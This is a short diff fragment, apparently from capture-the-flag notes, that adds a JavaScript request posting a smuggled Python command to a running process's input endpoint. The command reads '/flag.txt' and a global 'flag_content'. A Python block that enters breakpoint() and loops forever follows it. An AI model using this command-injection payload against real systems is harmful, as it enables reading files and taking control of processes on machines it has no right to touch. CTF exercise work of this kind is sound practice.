@@ -60,3 +60,19 @@ print("Payload active, waiting for the hidden code...")
     }
 })();
 ```
+# 复仇
+```javascript
+fetch('/api/send_input', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+        pid: '07e8460f4ead6ae8', // 确认这个PID依然是当前运行的那个
+        input: '!import sys; print("---FLAG---"); print(globals().get("flag_content")); print(open("/flag.txt").read()); sys.stdout.flush()'
+    })
+});
+```
+```python
+breakpoint()
+while True:
+    pass
+```
